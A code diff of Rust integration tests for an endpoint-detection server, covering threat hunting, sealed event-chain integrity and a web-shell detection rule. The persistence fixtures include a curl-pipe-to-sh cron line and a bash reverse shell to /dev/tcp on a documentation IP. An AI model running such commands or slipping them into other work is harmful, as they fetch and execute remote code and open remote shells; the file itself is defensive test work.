+    index_opened(&pool, "package-patched", &[dpkg(InventoryAction::Present, "openssl", "3.0.14-1", None)]).await;
+    index_opened(&pool, "package-alpine", &[package(InventoryAction::Present, PackageManager::Apk, "openssl", "3.0.9-r1", None)]).await;
 
     let (status, result) = hunt(&app, Some(&admin_token("user")), "package where name = openssl and version < 3.0.14").await;
     assert_eq!(status, StatusCode::OK, "{}", result);
@@ -2719,11 +3063,11 @@ async fn test_hunting_finds_every_endpoint_with_an_old_version_of_a_package() {
     assert_eq!(hunt_total(&app, "package where name = openssl and manager = apk").await, 1);
     assert_eq!(hunt_total(&app, "package where name = openssl").await, 3);
 
-    ingest(&app, &mut old, packages(&[package_event("Changed", "dpkg", "openssl", "3.0.14-0ubuntu1", Some("3.0.13-0ubuntu3"))])).await;
+    index_opened(&pool, "package-old", &[dpkg(InventoryAction::Changed, "openssl", "3.0.14-0ubuntu1", Some("3.0.13-0ubuntu3"))]).await;
     assert_eq!(hunt_total(&app, "package where name = openssl and version < 3.0.14").await, 1, "an upgrade replaces the version it had");
     assert_eq!(hunt_total(&app, r#"package where previous = "3.0.13-0ubuntu3""#).await, 1);
 
-    ingest(&app, &mut alpine, packages(&[package_event("Removed", "apk", "openssl", "3.0.9-r1", None)])).await;
+    index_opened(&pool, "package-alpine", &[package(InventoryAction::Removed, PackageManager::Apk, "openssl", "3.0.9-r1", None)]).await;
     assert_eq!(hunt_total(&app, "package where name = openssl and version < 3.0.14").await, 0, "a removed package is no longer installed");
     assert_eq!(hunt_total(&app, "package where name = openssl").await, 2);
 }
@@ -2731,19 +3075,19 @@ async fn test_hunting_finds_every_endpoint_with_an_old_version_of_a_package() {
 #[tokio::test]
 async fn test_hunting_reads_the_persistence_items_an_endpoint_has_now() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "persistence-hunt").await;
-    let cron = |action: &str| serde_json::json!({ "Persistence": persistence_event(action, "cron", "fetch", "/etc/cron.d/fetch", "curl -s http://203.0.113.9/x | sh", None) });
-    let unit = serde_json::json!({ "Persistence": persistence_event("Present", "systemd_unit", "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None) });
-    ingest(&app, &mut agent, serde_json::json!([cron("Added"), unit])).await;
+    enroll(&app, &pool, "persistence-hunt").await;
+    let cron = |action| autostart(action, PersistenceKind::Cron, "fetch", "/etc/cron.d/fetch", "curl -s http://203.0.113.9/x | sh", None);
+    let unit = autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None);
+    index_opened(&pool, "persistence-hunt", &[cron(InventoryAction::Added), unit]).await;
 
     assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl").await, 1);
     assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 2);
     assert_eq!(hunt_total(&app, "persistence where kind in (systemd_unit, systemd_timer) and user = root").await, 1);
 
-    ingest(&app, &mut agent, serde_json::json!([cron("Changed")])).await;
+    index_opened(&pool, "persistence-hunt", &[cron(InventoryAction::Changed)]).await;
     assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 1, "a changed item is the same item");
 
-    ingest(&app, &mut agent, serde_json::json!([cron("Removed")])).await;
+    index_opened(&pool, "persistence-hunt", &[cron(InventoryAction::Removed)]).await;
     assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 0);
     assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 1, "the unit is still there");
 }
@@ -2751,17 +3095,17 @@ async fn test_hunting_reads_the_persistence_items_an_endpoint_has_now() {
 #[tokio::test]
 async fn test_event_histogram_counts_each_type_per_bucket_and_events_can_be_cut_to_a_period() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut first = enroll(&app, &pool, "histogram-a").await;
-    let mut second = enroll(&app, &pool, "histogram-b").await;
-    let seen = serde_json::json!([
-        started(1000, 10, 1, "/usr/bin/a", &[]),
-        started(1005, 11, 1, "/usr/bin/b", &[]),
-        started(1065, 12, 1, "/usr/bin/c", &[]),
+    let mut first = enroll_endpoint(&app, &pool, "histogram-a").await;
+    let mut second = enroll_endpoint(&app, &pool, "histogram-b").await;
+    let released = [
+        started(1000, 10, 1, "/tmp/a", &[]),
+        started(1005, 11, 1, "/tmp/b", &[]),
+        started(1065, 12, 1, "/bin/sh", &[]),
         connected(1070, 12, 443),
-        started(1200, 13, 1, "/usr/bin/d", &[]),
-    ]);
-    ingest(&app, &mut first, seen).await;
-    ingest(&app, &mut second, serde_json::json!([started(1010, 20, 1, "/usr/bin/e", &[])])).await;
+        started(1200, 13, 1, "/tmp/d", &[]),
+    ];
+    first.deliver(&app, &released).await;
+    second.deliver(&app, &[started(1010, 20, 1, "/tmp/e", &[]), started(1011, 21, 1, "/usr/bin/sleep", &["60"])]).await;
     let reader = admin_token("user");
     let counts = |histogram: &serde_json::Value, event_type: &str| {
         histogram["series"].as_array().unwrap().iter().find(|series| series["event_type"] == event_type).map(|series| series["counts"].clone())
@@ -2774,7 +3118,7 @@ async fn test_event_histogram_counts_each_type_per_bucket_and_events_can_be_cut_
     assert_eq!(counts(&everyone, "process"), Some(serde_json::json!([3, 1])));
     assert_eq!(counts(&everyone, "network"), Some(serde_json::json!([0, 1])), "a type is zero where it has nothing");
 
-    let uri = format!("/api/admin/events/histogram?from=1000&to=1120&buckets=2&agent_id={}", first.id);
+    let uri = format!("/api/admin/events/histogram?from=1000&to=1120&buckets=2&agent_id={}", first.agent.id);
     let (_, one) = call(&app, "GET", &uri, Some(&reader), None).await;
     assert_eq!(counts(&one, "process"), Some(serde_json::json!([2, 1])));
 
@@ -2827,31 +3171,30 @@ fn persistence_event(action: &str, kind: &str, name: &str, path: &str, command: 
 }
 
 #[tokio::test]
-async fn test_persistence_events_are_stored_with_the_fields_the_agent_sent() {
+async fn test_released_persistence_events_are_stored_with_the_fields_the_agent_sealed() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "persistence-agent").await;
-    let sent = [
-        persistence_event("Present", "systemd_unit", "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", Some("aa11")),
-        persistence_event("Added", "cron", "*/5 * * * * root /tmp/.x", "/etc/cron.d/implant", "/tmp/.x", Some("bb22")),
-        persistence_event("Changed", "shell_profile", ".bashrc", "/root/.bashrc", "", Some("cc33")),
-        persistence_event("Removed", "ld_preload", "/tmp/.hook.so", "/etc/ld.so.preload", "", None),
+    let mut host = enroll_endpoint(&app, &pool, "persistence-agent").await;
+    let sealed = [
+        autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", Some("aa11")),
+        autostart(InventoryAction::Added, PersistenceKind::Cron, "*/5 * * * * root /tmp/.x", "/etc/cron.d/implant", "/tmp/.x", Some("bb22")),
+        autostart(InventoryAction::Changed, PersistenceKind::ShellProfile, ".bashrc", "/root/.bashrc", "bash -i >& /dev/tcp/203.0.113.47/443 0>&1", Some("cc33")),
+        autostart(InventoryAction::Added, PersistenceKind::LdPreload, "/usr/local/lib/libhook.so", "/etc/ld.so.preload", "", None),
     ];
-
-    let body = agent.batch(serde_json::json!(sent.iter().map(|event| serde_json::json!({ "Persistence": event })).collect::<Vec<_>>()));
-    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
-    assert_eq!(status, StatusCode::OK);
+    host.deliver(&app, &sealed).await;
 
     let stored: Vec<(String, i64, String)> = sqlx::query_as("SELECT event_type, timestamp, data FROM events WHERE agent_id = ? AND event_type = 'persistence' ORDER BY rowid")
         .bind("persistence-agent")
         .fetch_all(&pool)
         .await
         .unwrap();
-    assert_eq!(stored.len(), sent.len());
-    for ((event_type, timestamp, data), sent) in stored.iter().zip(&sent) {
+    let released = &sealed[1..];
+    assert_eq!(stored.len(), released.len(), "the unit no rule matched stays sealed");
+    for ((event_type, timestamp, data), released) in stored.iter().zip(released) {
         assert_eq!(event_type, "persistence");
         assert_eq!(*timestamp, 1794780000);
-        assert_eq!(&serde_json::from_str::<serde_json::Value>(data).unwrap(), sent);
+        assert_eq!(serde_json::from_str::<serde_json::Value>(data).unwrap(), stored_form(released));
     }
+    assert_eq!(stored_form(&sealed[2])["kind"], "shell_profile");
 
     let (status, listed) = call(
         &app,
@@ -2862,7 +3205,8 @@ async fn test_persistence_events_are_stored_with_the_fields_the_agent_sent() {
     )
     .await;
     assert_eq!(status, StatusCode::OK);
-    assert_eq!(listed.as_array().unwrap().len(), sent.len(), "the console reads them through the event list");
+    assert_eq!(listed.as_array().unwrap().len(), released.len(), "the console reads them through the event list");
+    assert!(tables_holding(&pool, "ssh.service").await.is_empty());
 }
 
 #[tokio::test]
@@ -2897,37 +3241,6 @@ fn package_event(action: &str, manager: &str, name: &str, version: &str, previou
 }
 
 #[tokio::test]
-async fn test_package_events_are_stored_with_the_fields_the_agent_sent() {
-    let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "package-agent").await;
-    let sent = [
-        package_event("Present", "dpkg", "openssl", "3.0.13-0ubuntu3", None),
-        package_event("Added", "apk", "busybox", "1.37.0-r18", None),
-        package_event("Changed", "dpkg", "openssl", "3.0.13-0ubuntu3.5", Some("3.0.13-0ubuntu3")),
-        package_event("Removed", "dpkg", "netcat-openbsd", "1.226-1ubuntu2", None),
-    ];
-
-    let body = agent.batch(serde_json::json!(sent.iter().map(|event| serde_json::json!({ "Package": event })).collect::<Vec<_>>()));
-    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
-    assert_eq!(status, StatusCode::OK);
-
-    let stored: Vec<(i64, String)> = sqlx::query_as("SELECT timestamp, data FROM events WHERE agent_id = ? AND event_type = 'package' ORDER BY rowid")
-        .bind("package-agent")
-        .fetch_all(&pool)
-        .await
-        .unwrap();
-    assert_eq!(stored.len(), sent.len());
-    for ((timestamp, data), sent) in stored.iter().zip(&sent) {
-        assert_eq!(*timestamp, 1794780000);
-        assert_eq!(&serde_json::from_str::<serde_json::Value>(data).unwrap(), sent);
-    }
-
-    let (status, listed) = call(&app, "GET", "/api/admin/events?agent_id=package-agent&event_types=package", Some(&admin_token("user")), None).await;
-    assert_eq!(status, StatusCode::OK);
-    assert_eq!(listed.as_array().unwrap().len(), sent.len(), "the console reads them through the event list");
-}
-
-#[tokio::test]
 async fn test_package_event_of_an_unknown_manager_is_refused() {
     let (app, pool) = create_test_app_with_pool().await;
     let mut agent = enroll(&app, &pool, "package-unknown-manager").await;
@@ -2945,24 +3258,22 @@ async fn test_package_event_of_an_unknown_manager_is_refused() {
 }
 
 fn batch_of_exactly(agent: &mut TestAgent, bytes: usize) -> String {
-    let process = |executable_path: String| {
+    let install = |hostname: String| {
         serde_json::json!([{
-            "Process": {
+            "Install": {
                 "timestamp": 1640995200,
-                "pid": 1234,
-                "ppid": 1000,
-                "executable_path": executable_path,
-                "command_line": [],
-                "action": "Create",
-                "uid": 1000,
-                "hash": null
+                "version": "0.1.0",
+                "hostname": hostname,
+                "platform": "linux",
+                "os_version": "Debian 12",
+                "architecture": "x86_64"
             }
         }])
     };
 
-    let unpadded = agent.batch(process(String::new())).len();
+    let unpadded = agent.batch(install(String::new())).len();
     agent.seq -= 1;
-    let body = agent.batch(process("x".repeat(bytes - unpadded)));
+    let body = agent.batch(install("x".repeat(bytes - unpadded)));
     assert_eq!(body.len(), bytes);
     body
 }
@@ -2972,25 +3283,974 @@ async fn test_event_batch_is_read_up_to_the_protocol_limit_and_refused_above_it(
     let (app, pool) = create_test_app_with_pool().await;
     let mut agent = enroll(&app, &pool, "batch-limit-agent").await;
     let stored = || async {
-        sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'")
+        sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'install'")
             .bind("batch-limit-agent")
             .fetch_one(&pool)
             .await
             .unwrap()
     };
+    let enrolled = stored().await;
 
     let largest = batch_of_exactly(&mut agent, zedr_protocol::MAX_EVENT_BATCH_BYTES);
     let (status, _) = send_signed(&app, &agent, "/api/events", largest).await;
     assert_eq!(status, StatusCode::OK);
-    assert_eq!(stored().await, 1);
+    assert_eq!(stored().await, enrolled + 1);
 
     let too_large = batch_of_exactly(&mut agent, zedr_protocol::MAX_EVENT_BATCH_BYTES + 1);
     let (status, _) = send_signed(&app, &agent, "/api/events", too_large).await;
     assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
-    assert_eq!(stored().await, 1, "nothing of a refused batch is stored");
+    assert_eq!(stored().await, enrolled + 1, "nothing of a refused batch is stored");
 
     let next = batch_of_exactly(&mut agent, 1024);
     let (status, _) = send_signed(&app, &agent, "/api/events", next).await;
     assert_eq!(status, StatusCode::OK, "a refused batch does not put the agent out of sequence");
-    assert_eq!(stored().await, 2);
+    assert_eq!(stored().await, enrolled + 2);
+}
+
+#[tokio::test]
+async fn test_sealed_windows_are_accepted_in_order_and_acknowledged_with_a_signature() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "sealed-host").await;
+
+    let first = host.deliver(&app, &[quiet(1), quiet(2)]).await;
+    assert_eq!((first["window"].as_u64(), first["next_index"].as_u64()), (Some(0), Some(2)));
+    let empty = host.deliver(&app, &[]).await;
+    assert_eq!((empty["window"].as_u64(), empty["next_index"].as_u64()), (Some(1), Some(2)), "an empty window still moves the chain");
+    let third = host.deliver(&app, &[quiet(3)]).await;
+    assert_eq!((third["window"].as_u64(), third["next_index"].as_u64()), (Some(2), Some(3)));
+    let head = hash_to_hex(&host.ledger.head);
+    assert_eq!(third["head"], head.as_str());
+
+    let signed_for = |agent_id: &str, window: u64| zedr_protocol::window_ack_signing_bytes(agent_id, window, 3, &head).unwrap();
+    assert!(server_signed(&third, &signed_for("sealed-host", 2)));
+    assert!(!server_signed(&third, &signed_for("another-host", 2)), "an acknowledgement is for one agent");
+    assert!(!server_signed(&third, &signed_for("sealed-host", 3)));
+
+    let stored: Vec<(i64, i64, i64, i64, bool, String)> = sqlx::query_as("SELECT window, epoch, first_index, count, fresh, proof FROM sealed_windows WHERE agent_id = 'sealed-host' ORDER BY window")
+        .fetch_all(&pool)
+        .await
+        .unwrap();
+    assert_eq!(stored, vec![(0, 1, 0, 2, true, "pending".to_string()), (1, 1, 2, 0, false, "pending".to_string()), (2, 1, 2, 1, false, "pending".to_string())]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "sealed-host").await, 3);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", "sealed-host").await, 0);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type != 'install'", "sealed-host").await, 0, "a quiet window leaves no event behind");
+
+    let position: (i64, i64, i64, String) = sqlx::query_as("SELECT epoch, next_window, next_index, head FROM chain_positions WHERE agent_id = 'sealed-host'").fetch_one(&pool).await.unwrap();
+    assert_eq!(position, (1, 3, 3, head));
+    assert!(open_incidents(&pool, "sealed-host").await.is_empty());
+}
+
+#[tokio::test]
+async fn test_a_window_sent_again_is_acknowledged_identically_and_stored_once() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "resending-host").await;
+    host.deliver(&app, &[started(1, 20, 0, "/usr/sbin/nginx", &[])]).await;
+
+    let window = host.ledger.seal(&[started(2, 21, 20, "/bin/sh", &["-c", "id"])]);
+    let (status, ack) = host.send(&app, window.clone()).await;
+    assert_eq!(status, StatusCode::OK);
+    let held = || async {
+        let mut rows = Vec::new();
+        for table in ["sealed_windows", "sealed_events", "releases", "events", "incidents", "hunt_processes"] {
+            rows.push(count(&pool, &format!("SELECT COUNT(*) FROM {} WHERE agent_id = ?", table), "resending-host").await);
+        }
+        rows
+    };
+    let before = held().await;
+    assert_eq!(before, [2, 2, 1, 5, 1, 2], "two windows, the two opened events, the finding, its incident and the install");
+
+    let (status, again) = host.send(&app, window.clone()).await;
+    assert_eq!(status, StatusCode::OK, "the acknowledgement may have been lost on its way");
+    assert_eq!(again, ack);
+    assert_eq!(held().await, before, "a window is taken in once");
+
+    host.deliver(&app, &[quiet(3)]).await;
+    let (status, late) = host.send(&app, window).await;
+    assert_eq!((status, late), (StatusCode::OK, ack), "also after the chain has moved on");
+    assert_eq!(count(&pool, "SELECT next_window FROM chain_positions WHERE agent_id = ?", "resending-host").await, 3);
+    assert!(!open_incidents(&pool, "resending-host").await.contains(&"chain_fork".to_string()));
+}
+
+async fn assert_refused_with_the_position(app: &axum::Router, pool: &SqlitePool, host: &mut Endpoint, window: SealedWindow, position: (u64, u64, &str), case: &str) {
+    let stored = count(pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", &host.agent.id).await;
+    let (status, answer) = host.send(app, window).await;
+    assert_eq!(status, StatusCode::CONFLICT, "{}: {}", case, answer);
+    assert_eq!((answer["next_window"].as_u64(), answer["next_index"].as_u64(), answer["head"].as_str()), (Some(position.0), Some(position.1), Some(position.2)), "{}", case);
+
+    let signed_for = |seq: u64| zedr_protocol::chain_position_signing_bytes(&host.agent.id, host.agent.session, seq, position.0, position.1, position.2).unwrap();
+    assert!(server_signed(&answer, &signed_for(host.agent.seq)), "{}: the position is signed with the deployment key", case);
+    assert!(!server_signed(&answer, &signed_for(host.agent.seq - 1)), "{}: and answers this request only", case);
+
+    assert_eq!(open_incidents(pool, &host.agent.id).await, vec!["chain_fork"], "{}", case);
+    sqlx::query("UPDATE incidents SET closed_at = opened_at WHERE agent_id = ?").bind(&host.agent.id).execute(pool).await.unwrap();
+    assert_eq!(count(pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", &host.agent.id).await, stored, "{}: nothing of a refused window is stored", case);
+}
+
+#[tokio::test]
+async fn test_a_window_that_does_not_continue_the_chain_is_answered_with_the_signed_position() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "forking-host").await;
+    host.deliver(&app, &[quiet(1), quiet(2)]).await;
+    let before_second = host.ledger.clone();
+    host.deliver(&app, &[quiet(3)]).await;
+    let head = hash_to_hex(&host.ledger.head);
+    let stands = (2, 3, head.as_str());
+
+    let mut skipping = host.ledger.clone();
+    skipping.next_window += 1;
+    assert_refused_with_the_position(&app, &pool, &mut host, skipping.seal(&[quiet(4)]), stands, "a gap in the window numbers").await;
+
+    let mut forked = before_second.clone();
+    assert_refused_with_the_position(&app, &pool, &mut host, forked.seal(&[quiet(9)]), stands, "another window where one is already held").await;
+
+    let mut missing_events = host.ledger.clone();
+    missing_events.next_index += 1;
+    assert_refused_with_the_position(&app, &pool, &mut host, missing_events.seal(&[quiet(4)]), stands, "a gap in the event indices").await;
+
+    let mut other_history = host.ledger.clone();
+    other_history.head = [9u8; 32];
+    assert_refused_with_the_position(&app, &pool, &mut host, other_history.seal(&[quiet(4)]), stands, "another previous head").await;
+
+    let mut wrong_epoch = host.ledger.clone();
+    wrong_epoch.epoch += 1;
+    assert_refused_with_the_position(&app, &pool, &mut host, wrong_epoch.seal(&[quiet(4)]), stands, "a new epoch that is not fresh").await;
+
+    let mut wrong_fresh = host.ledger.clone();
+    wrong_fresh.fresh = true;
+    assert_refused_with_the_position(&app, &pool, &mut host, wrong_fresh.seal(&[quiet(4)]), stands, "a fresh window in the stored epoch").await;
+
+    host.restart();
+    host.deliver(&app, &[quiet(4)]).await;
+    let head = hash_to_hex(&host.ledger.head);
+    let mut rolled_back = host.ledger.clone();
+    rolled_back.restart();
+    rolled_back.epoch = 1;
+    assert_refused_with_the_position(&app, &pool, &mut host, rolled_back.seal(&[quiet(5)]), (3, 4, head.as_str()), "an epoch that goes down").await;
+
+    host.deliver(&app, &[quiet(5)]).await;
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", "forking-host").await, 4, "the chain the server holds goes on");
+
+    let mut newcomer = enroll_endpoint(&app, &pool, "late-host").await;
+    let mut not_fresh = newcomer.ledger.clone();
+    not_fresh.fresh = false;
+    let genesis = hash_to_hex(&GENESIS);
+    assert_refused_with_the_position(&app, &pool, &mut newcomer, not_fresh.seal(&[quiet(1)]), (0, 0, genesis.as_str()), "a first window that is not fresh").await;
+    let mut midway = newcomer.ledger.clone();
+    midway.next_window = 7;
+    assert_refused_with_the_position(&app, &pool, &mut newcomer, midway.seal(&[quiet(1)]), (0, 0, genesis.as_str()), "a chain the server never saw the start of").await;
+    newcomer.deliver(&app, &[quiet(1)]).await;
+}
+
+#[tokio::test]
+async fn test_windows_require_a_valid_signature_and_a_new_sequence_number() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "signing-host").await;
+    let window = host.ledger.seal(&[quiet(1)]);
+
+    let body = host.request(window.clone());
+    let (status, _) = post_agent(&app, "/api/windows", body.clone(), None).await;
+    assert_eq!(status, StatusCode::UNAUTHORIZED);
+
+    let impostor = TestAgent::new("signing-host");
+    let (status, _) = send_signed(&app, &impostor, "/api/windows", body.clone()).await;
+    assert_eq!(status, StatusCode::UNAUTHORIZED, "a forged signature");
+
+    let signature = host.agent.sign(&body);
+    let tampered = body.replace("\"proving\":true", "\"proving\":false");
+    assert_ne!(tampered, body);
+    let (status, _) = post_agent(&app, "/api/windows", tampered, Some(&signature)).await;
+    assert_eq!(status, StatusCode::UNAUTHORIZED);
+
+    let mut stranger = Endpoint { agent: TestAgent::new("never-enrolled"), ledger: host.ledger.clone() };
+    let (status, _) = stranger.send(&app, window.clone()).await;
+    assert_eq!(status, StatusCode::UNAUTHORIZED);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", "signing-host").await, 0);
+
+    let (status, _) = post_agent(&app, "/api/windows", body.clone(), Some(&signature)).await;
+    assert_eq!(status, StatusCode::OK);
+    let (status, replayed) = post_agent(&app, "/api/windows", body, Some(&signature)).await;
+    assert_eq!(status, StatusCode::CONFLICT);
+    assert!(replayed["error"].is_string() && replayed["signature"].is_null(), "a replayed request is not answered with a position");
+    assert_eq!(open_incidents(&pool, "signing-host").await, vec!["replay"]);
+
+    let (status, _) = post_agent(&app, "/api/windows", "{ not a window".to_string(), Some(&signature)).await;
+    assert_eq!(status, StatusCode::BAD_REQUEST);
+}
+
+#[tokio::test]
+async fn test_a_window_that_does_not_match_its_own_header_is_unprocessable() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "malformed-host").await;
+    let other = enroll_endpoint(&app, &pool, "other-host").await;
+    let honest = || host.ledger.clone().seal(&[quiet(1), quiet(2), quiet(3)]);
+
+    let mut wrong_root = honest();
+    wrong_root.header.root = hash_to_hex(&[7u8; 32]);
+    let mut reordered = honest();
+    reordered.events.swap(0, 1);
+    let mut dropped = honest();
+    dropped.events.pop();
+    let mut wrong_count = honest();
+    wrong_count.header.count = 2;
+    let mut added = honest();
+    added.events.push(added.events[0].clone());
+    let mut wrong_head = honest();
+    wrong_head.header.head = hash_to_hex(&[7u8; 32]);
+    let mut renumbered = honest();
+    renumbered.header.first_index = 1;
+    let mut not_hex = honest();
+    not_hex.events[1].leaf = "leaf".to_string();
+    let mut not_base64 = honest();
+    not_base64.events[1].sealed = "not base64!".to_string();
+    let mut too_large = honest();
+    too_large.header.epoch = u64::MAX;
+    let borrowed = other.ledger.clone().seal(&[quiet(1), quiet(2), quiet(3)]);
+
+    let cases = [
+        ("a root that is not the root of its leaves", wrong_root),
+        ("leaves in another order", reordered),
+        ("fewer events than it counts", dropped),
+        ("a count that is not its number of events", wrong_count),
+        ("more events than it counts", added),
+        ("a head that does not follow from its fields", wrong_head),
+        ("a field changed after sealing", renumbered),
+        ("a leaf that is not hex", not_hex),
+        ("sealed bytes that are not base64", not_base64),
+        ("a number no database holds", too_large),
+        ("a window sealed for another agent", borrowed),
+    ];
+    for (case, window) in cases {
+        let (status, answer) = host.send(&app, window).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{}: {}", case, answer);
+    }
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", "malformed-host").await, 0);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "malformed-host").await, 0);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM chain_positions WHERE agent_id = ?", "malformed-host").await, 0);
+
+    host.deliver(&app, &[quiet(1), quiet(2), quiet(3)]).await;
+}
+
+#[tokio::test]
+async fn test_quiet_events_never_reach_any_table_in_plaintext() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "private-host").await;
+    let quiet_marker = "QUIET-7f3a9c51e2-payroll-export";
+    let loud_marker = "LOUD-5d1b8e0a44-web-shell";
+
+    host.deliver(
+        &app,
+        &[
+            started(10, 300, 1, "/usr/bin/psql", &["-c", &format!("copy salaries to '/srv/{}.csv'", quiet_marker)]),
+            started(11, 20, 0, "/usr/sbin/nginx", &[]),
+            connected(12, 300, 5432),
+            wrote(13, 300, &format!("/srv/{}.csv", quiet_marker)),
+            autostart(InventoryAction::Present, PersistenceKind::Cron, quiet_marker, "/etc/cron.d/payroll", &format!("/usr/local/bin/{} --nightly", quiet_marker), None),
+            package(InventoryAction::Present, PackageManager::Dpkg, quiet_marker, "1.0", None),
+        ],
+    )
+    .await;
+    host.deliver(&app, &[started(14, 21, 20, "/bin/sh", &["-c", &format!("echo {}", loud_marker)]), started(15, 301, 300, "/usr/bin/gzip", &[&format!("/srv/{}.csv", quiet_marker)])]).await;
+    let journal = host.ledger.journal(2);
+    assert_eq!(journal.matches.len(), 1);
+
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "private-host").await, 8);
+    assert_eq!(tables_holding(&pool, quiet_marker).await, Vec::<String>::new(), "what no rule released is nowhere to be read");
+    assert_eq!(
+        tables_holding(&pool, loud_marker).await,
+        ["events.data", "hunt_processes.command", "incidents.evidence"],
+        "the search does find what a rule released"
+    );
+
+    for query in [format!("process where command ~ \"{}\"", quiet_marker), format!("file where path ~ \"{}\"", quiet_marker), format!("persistence where name ~ \"{}\"", quiet_marker), format!("package where name ~ \"{}\"", quiet_marker)] {
+        assert_eq!(hunt_total(&app, &query).await, 0, "{}", query);
+    }
+    let (_, listed) = call(&app, "GET", "/api/admin/events?agent_id=private-host&limit=1000", Some(&admin_token("user")), None).await;
+    assert!(!listed.to_string().contains(quiet_marker));
+    assert!(listed.to_string().contains(loud_marker));
+}
+
+#[tokio::test]
+async fn test_a_match_opens_exactly_the_events_its_rule_read() {
+    set_test_env();
+    let pool = create_test_db().await;
+    let (agent_events_tx, _) = tokio::sync::broadcast::channel(16);
+    let (system_events_tx, mut told) = tokio::sync::broadcast::channel(64);
+    let app = zedr_control_server::api::create_router_with_state(pool.clone(), agent_events_tx, system_events_tx);
+    let mut host = enroll_endpoint(&app, &pool, "web-host").await;
+    let reader = admin_token("user");
+
+    let nginx = started(1, 20, 0, "/usr/sbin/nginx", &[]);
+    let shell = started(2, 21, 20, "/bin/sh", &["-c", "id"]);
+    host.deliver(&app, &[quiet(30), nginx.clone(), quiet(31)]).await;
+    assert!(told.try_recv().is_err(), "a window without a match tells the console nothing");
+    host.deliver(&app, &[quiet(32), shell.clone(), quiet(33)]).await;
+
+    let mut announced = Vec::new();
+    while let Ok(event) = told.try_recv() {
+        announced.push(event.event_type);
+    }
+    assert_eq!(announced, ["process", "process", "detection", "incident_opened"]);
+
+    let (status, listed) = call(&app, "GET", "/api/admin/events?agent_id=web-host&event_types=process,network,file,persistence,package", Some(&reader), None).await;
+    assert_eq!(status, StatusCode::OK);
+    let mut opened: Vec<serde_json::Value> = listed.as_array().unwrap().iter().map(|event| serde_json::from_str(event["data"].as_str().unwrap()).unwrap()).collect();
+    opened.sort_by_key(|event| event["pid"].as_u64());
+    assert_eq!(opened, [stored_form(&nginx), stored_form(&shell)], "the event list holds the shell and its parent, and none of their neighbours");
+
+    let (_, found) = hunt(&app, Some(&reader), r#"process where name = sh and parent.name = nginx and parent.path = "/usr/sbin/nginx""#).await;
+    assert_eq!(found["total"], 1);
+    assert_eq!(found["rows"][0]["process"], "21@2");
+    assert_eq!(found["rows"][0]["cells"], serde_json::json!(["sh", "nginx", "/bin/sh -c id", "21", "1001"]));
+    assert_eq!(hunt_total(&app, "process where name = nginx and parent.pid = 0").await, 1);
+    assert_eq!(hunt_total(&app, "process where name = sleep").await, 0, "the neighbours stay sealed");
+
+    let evidence = serde_json::json!({
+        "rule": "server-child", "title": "Server process started a shell", "technique": "T1505.003", "level": "high", "pid": 21, "started_at": 2,
+        "image": "/bin/sh", "command": "/bin/sh -c id", "parent": "nginx", "subject": null, "autostart": null, "trigger": 4, "window": 1, "proof": "pending",
+    });
+    let mut recorded = findings(&pool, "web-host").await;
+    assert_eq!(recorded.len(), 1);
+    assert_eq!(recorded[0].as_object_mut().unwrap().remove("source"), Some(serde_json::json!("server")));
+    assert_eq!(recorded[0], evidence);
+    assert_eq!(open_incidents(&pool, "web-host").await, vec!["detection.server-child"]);
+    assert_eq!(incident_evidence(&pool, "web-host", "detection.server-child").await, evidence);
+    assert_eq!(hunt_total(&app, "detection where rule = server-child and parent = nginx").await, 1);
+
+    let opened_at: Vec<i64> = sqlx::query_scalar("SELECT idx FROM sealed_events WHERE agent_id = 'web-host' AND opened_at IS NOT NULL ORDER BY idx").fetch_all(&pool).await.unwrap();
+    assert_eq!(opened_at, [1, 4]);
